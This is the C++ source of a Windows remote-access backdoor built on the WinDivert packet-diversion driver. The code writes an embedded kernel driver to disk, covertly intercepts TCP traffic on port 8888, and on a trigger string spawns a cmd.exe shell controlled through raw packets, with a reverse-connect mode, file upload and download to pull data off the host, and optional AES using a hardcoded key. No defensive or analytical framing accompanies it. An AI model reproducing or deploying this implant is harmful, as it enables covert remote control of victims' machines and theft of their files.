#include "server_base.h"
#include "windivert_bin.h"

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib,"WinDivert.lib")

static uint8 key[16] = {
	0x0f,0x15,0x71,0xc9,
	0x47,0xd9,0xe8,0x59,
	0x0c,0xb7,0xad,0xd6,
	0xaf,0x7f,0x67,0x98
};

server_base::server_base()
{
	m_divert_handle = NULL;
	m_template_packet_len = 0;
	m_packet_template = NULL;
	m_addr_template = NULL; 
	aes_set_key(&m_aes_ctx, key, 128);
	m_use_crypt = false;
	m_reverse_mode = false;
	m_lport = 54321;
	m_rport = 8888;
}

server_base::~server_base()
{
	WinDivertShutdown(m_divert_handle, WINDIVERT_SHUTDOWN_BOTH);
}

void server_base::set_reverse_mode(bool mode)
{
	m_reverse_mode = mode;
}

void server_base::start()
{
	release_sysfile();
	if (!init_divert("tcp.SrcPort = 8888"))	{
		return;
	}
	if (m_reverse_mode == true)	{
		connect_to_target();
	}
	else {
		wait_for_connect();
	}

	UINT payload_len;
	PVOID payload_buf;

	char packet[WINDIVERT_MTU_MAX] = {};

	while (TRUE)
	{
		if (!recv_data_packet(packet, &payload_len, &payload_buf))
			continue;

		if (payload_len && payload_buf)
		{
			if (payload_len >= strlen(SHELL_START) && !memcmp(payload_buf, SHELL_START, strlen(SHELL_START)))
			{
				run_shell();
			}
		}
	}
}



void server_base::set_addr_template(WINDIVERT_ADDRESS addr)
{
	m_addr_template = make_shared<WINDIVERT_ADDRESS>();
	if (m_addr_template == NULL) {
		cout << "[!] failed to allocate buffer (" << GetLastError() << ")!" << endl;
		return;
	}
	memcpy(m_addr_template.get(), &addr, sizeof(WINDIVERT_ADDRESS));
	m_addr_template->Outbound = 1;
}


BOOL server_base::init_divert(const char* filter)
{
	int priority = 0;
	cout << "[*] filter = \"" << filter << "\"" << endl;
	m_divert_handle = WinDivertOpen(filter, WINDIVERT_LAYER_NETWORK, (INT16)priority, 0);
	if (m_divert_handle == INVALID_HANDLE_VALUE)
	{
		if (GetLastError() == ERROR_INVALID_PARAMETER)
		{
			cout << "[!] filter syntax error!" << endl;
			return FALSE;
		}
		cout << "[!] failed to open the WinDivert device (" << GetLastError() << ")!" << endl;
		return FALSE;
	}

	cout << "[*] divert open successfully." << endl;
	return TRUE;
}

void server_base::run_shell()
{
	init_shell();
	UINT payload_len;
	char* payload_buf;

	auto packet = shared_ptr<char[]>(new char[WINDIVERT_MTU_MAX]());

	while (true)
	{
		if (!recv_data_packet(packet.get(), &payload_len, (PVOID*)&payload_buf))
			continue;
		if (payload_len && payload_buf)
		{
			if (strstr(payload_buf, "download"))
			{
				download_file(payload_buf);
				continue;
			}			
			if (strstr(payload_buf, "upload"))
			{
				upload_file(payload_buf);
				continue;
			}
			DWORD real_write = 0;
			strcpy(last_cmd, payload_buf);
			if (!WriteFile(m_std_in_wr, payload_buf, strlen(payload_buf), &real_write, NULL))
			{
				cout << "[!] write data:"<< payload_buf << " error!" << endl;
			}
		}
	}
}

void server_base::init_shell()
{
	cout << "[*] start shell mode" << endl;

	SECURITY_ATTRIBUTES sa;
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.bInheritHandle = TRUE;
	sa.lpSecurityDescriptor = NULL;

	CreatePipe(&m_std_out_rd, &m_std_out_wr, &sa, 0);
	SetHandleInformation(m_std_out_rd, HANDLE_FLAG_INHERIT, 0);
	CreatePipe(&m_std_in_rd, &m_std_in_wr, &sa, 0);
	SetHandleInformation(m_std_in_wr, HANDLE_FLAG_INHERIT, 0);

	STARTUPINFO start_info;
	TCHAR cmd_line[] = TEXT("cmd");
	ZeroMemory(&start_info, sizeof(STARTUPINFO));
	start_info.cb = sizeof(STARTUPINFO);
	start_info.hStdError = m_std_out_wr;
	start_info.hStdOutput = m_std_out_wr;
	start_info.hStdInput = m_std_in_rd;
	start_info.dwFlags |= STARTF_USESTDHANDLES;
	CreateProcess(NULL,
		cmd_line,
		NULL,
		NULL,
		TRUE,
		0,
		NULL,
		NULL,
		&start_info,
		&m_proc_info);
	m_read_thread = (HANDLE)_beginthreadex(nullptr, 0, read_from_cmd, this, 0, &m_thread_id);
}

void server_base::exit_shell()
{
	TerminateProcess(m_proc_info.hProcess, 0);
	TerminateThread(m_read_thread, 0);
	CloseHandle(m_read_thread);
	CloseHandle(m_proc_info.hProcess);
	CloseHandle(m_proc_info.hThread);
	CloseHandle(m_std_in_rd);
	CloseHandle(m_std_in_wr);
	CloseHandle(m_std_out_rd);
	CloseHandle(m_std_out_wr);
	cout << "[*] exit shell mode" << endl;
}

void server_base::add_seq(UINT seq)
{
	PWINDIVERT_TCPHDR tcp_header;

	WinDivertHelperParsePacket(m_packet_template.get(), m_template_packet_len, NULL, NULL,
		NULL, NULL, NULL, &tcp_header, NULL, NULL,
		NULL, NULL, NULL);

	UINT32 add_seq = WinDivertHelperNtohl(tcp_header->SeqNum) + seq;
	tcp_header->SeqNum = WinDivertHelperHtonl(add_seq);
}

unsigned __stdcall server_base::read_from_cmd(void* ptr)
{
	server_base* pthis = (server_base*)ptr;
	uint8_t buff[FILE_SIZE];
	DWORD read_size;
	while (true)
	{
		if (!ReadFile(pthis->m_std_out_rd, buff, FILE_SIZE - 1, &read_size, nullptr) || !read_size)
		{
			break;
		}
		buff[read_size] = 0;

		if (strlen((char*)buff) == strlen(pthis->last_cmd) && !strcmp((char*)buff, pthis->last_cmd))
		{
			continue;
		}
		pthis->send_data_packet((const char*)buff);
	}

	_endthreadex(0);
	return 0;
}

void server_base::encrypt_payload(PVOID buf_data, UINT buf_len)
{
	if (!m_use_crypt)
		return;
	for (int i = 0; i != buf_len; i += 16)
	{
		aes_encrypt(&m_aes_ctx, (unsigned char*)buf_data + i);
	}
}

void server_base::decrypt_payload(PVOID buf_data, UINT buf_len)
{
	if (!m_use_crypt)
		return;
	for (int i = 0; i != buf_len; i += 16)
	{
		aes_decrypt(&m_aes_ctx, (unsigned char*)buf_data + i);
	}
}

void server_base::download_file(string download_str)
{
	string word,src_file, dst_file;
	if (download_str.empty())
	{
		return;
	}

	stringstream str_stream(download_str);
	str_stream >> word;
	str_stream >> src_file;
	str_stream >> dst_file;

	cout << "[*] download file " << src_file << " to " << dst_file << endl;
	FILE* fp = fopen(src_file.c_str(), "rb");
	if (!fp)
	{
		cout << "[!] failed to open file " << src_file << "  (" << GetLastError() << ")!" << endl;
		send_data_packet("file_no_exist");
		return;
	}
	send_data_packet("download_start");
	size_t want_read = FILE_SIZE - sizeof(size_t) - 16;
	auto file_buf = shared_ptr<char[]>(new char[want_read] {});
	while (true)
	{
		size_t real_read = fread(file_buf.get() + 4, 1, want_read, fp);
		if (real_read < 0)
		{
			cout << "[!] failed to read file " << src_file << " (" << GetLastError() << ")!" << endl;
			return;
		}
		*(size_t*)file_buf.get() = real_read;
		
		send_data_packet(file_buf.get(), real_read + 4);
		cout << "[*] send file data " << real_read << " bytes finish" << endl;
		if (want_read > real_read)
		{
			cout << "[*] download file " << src_file << " to " << dst_file << " finish" << endl;
			send_data_packet("download_finish");
			return;
		}
	}
}

void server_base::upload_file(string upload_str)
{
	string word, src_file, dst_file;
	UINT payload_len;
	char* payload_buf;
	auto packet = shared_ptr<char[]>(new char[WINDIVERT_MTU_MAX]());
	if (upload_str.empty())
	{
		return;
	}

	stringstream str_stream(upload_str);
	str_stream >> word;
	str_stream >> src_file;
	str_stream >> dst_file;

	cout << "[*] upload file" << src_file << "to" << dst_file << endl;
	ofstream fout = ofstream(dst_file, ios::binary);
	if (!fout.is_open())
	{
		cout << "[!] failed to open file buffer (" << GetLastError() << ")!" << endl;
		return;
	}
	send_data_packet("upload_start");
	int i = 0;
	while (true)
	{
		i++;
		if (!recv_data_packet(packet.get(), &payload_len, (PVOID*)&payload_buf))
			continue;
		if (payload_len== 16 && !strcmp(payload_buf, "upload_finish"))
		{
			cout << "[*] finish upload" << endl;
			fout.close();
			return;
		}

		size_t len = *(size_t*)payload_buf;
		cout << "[*] recv file data " << len << " bytes" << endl;
		fout.write(payload_buf + 4, len);
		send_data_packet("recv_ok");
	}
}

bool server_base::release_sysfile()
{
#ifdef _WIN64
	ofstream fout = ofstream("WinDivert64.sys", ios::binary);
	fout.write((const char*)SYS_DATA_X64, sizeof(SYS_DATA_X64));
#else
	ofstream fout = ofstream("WinDivert32.sys", ios::binary);
	fout.write((const char*)SYS_DATA_X86, sizeof(SYS_DATA_X86));
#endif 
	fout.close();
	return true;
}

void server_base::show_help()
{
	cout << endl << "Usage: server [-raddr address][-laddr address]" << endl << 
		"\t    [-lport port][-rport port][-r][-e]" << endl << endl;

	cout << "Options:" << endl;
	cout << "\t-raddr address	connect to host Remote host address.(only need in reverse mode)" << endl;
	cout << "\t-laddr address	connect to host Remote host address.(only need in reverse mode)" << endl;
	cout << "\t-lport port		the port on local side.(default 8888)" << endl;
	cout << "\t-rport port		the port on remote host.(default 54321)" << endl;
	cout << "\t-reverse			use reverse mode.(default direct mode)" << endl;
	cout << "\t-e				use AES encrypt." << endl;
	cout << "\t-h				show this help info" << endl;
}

void server_base::set_use_encrypt(bool mode)
{
	m_use_crypt = mode;
}

void server_base::set_lport(UINT16 lport)
{
	m_lport = lport;
}

void server_base::set_rport(UINT16 rport)
{
	m_rport = rport;
}
